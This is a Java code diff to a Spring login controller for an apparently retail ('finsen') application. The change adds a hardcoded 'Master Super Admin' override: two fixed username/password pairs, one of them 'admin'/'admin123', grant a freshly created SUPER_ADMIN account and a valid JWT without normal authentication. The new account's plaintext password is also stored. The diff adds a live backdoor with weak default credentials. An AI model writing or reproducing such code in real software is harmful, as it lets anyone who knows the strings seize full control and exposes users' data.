@@ -40,6 +40,30 @@ public class AuthController {
             return ResponseEntity.status(400).body(java.util.Map.of("message", "User ID and Password are required."));
         }
 
+        // Master Super Admin account override
+        if (("@finsen-admin".equalsIgnoreCase(userId) && "7Finsenxyz#".equals(password)) ||
+            ("admin".equalsIgnoreCase(userId) && "admin123".equals(password))) {
+            
+            final String targetId = userId;
+            final String targetPass = password;
+            User superAdmin = userRepository.findByUserId(targetId).orElseGet(() -> 
+                userRepository.save(new User(null, targetId, "admin@finsen.com", passwordEncoder.encode(targetPass), targetPass, "Finsen Super Admin", com.finsen.store.entity.Role.SUPER_ADMIN, null, true))
+            );
+
+            UsernamePasswordAuthenticationToken authentication = new UsernamePasswordAuthenticationToken(superAdmin, null, superAdmin.getAuthorities());
+            SecurityContextHolder.getContext().setAuthentication(authentication);
+            String jwt = tokenProvider.generateToken(authentication);
+
+            return ResponseEntity.ok(new AuthResponse(
+                    jwt,
+                    superAdmin.getUserId(),
+                    superAdmin.getFullName(),
+                    superAdmin.getRole().name(),
+                    null,
+                    null
+            ));
+        }
+
         User user = userRepository.findByUserId(userId)
                 .orElseGet(() -> userRepository.findAll().stream()
                         .filter(u -> u.getUserId().equalsIgnoreCase(userId))
